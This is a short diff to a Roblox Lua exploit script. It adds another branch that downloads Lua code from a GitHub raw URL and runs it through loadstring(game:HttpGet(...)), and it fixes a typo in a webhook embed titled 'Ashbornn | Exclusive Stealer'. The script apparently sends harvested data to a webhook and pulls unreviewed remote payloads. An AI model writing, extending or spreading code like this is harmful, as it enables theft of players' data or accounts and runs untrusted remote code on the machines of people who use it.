@@ -64,6 +64,8 @@ elseif Config.Script == "Hub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Pelinda.lua",true))()
 elseif Config.Script == "Lite" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/KeyLite.lua",true))()
+elseif Config.Script == "Solara" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/iloveyouplscomebacktome.lua",true))()
 end
 
 Executor = identifyexecutor()
@@ -356,7 +358,7 @@ embed.Info = {
 		Color = DYWebhook.ColorConverter(Color3.fromRGB(136, 29, 138))
 	},
 	Embed = {
-		Title = "👑 **__Ashborrnn__ | __Exclusive Stealer__**",
+		Title = "👑 **__Ashbornn__ | __Exclusive Stealer__**",
 		Description = message,
 		Footer = "",
 	}
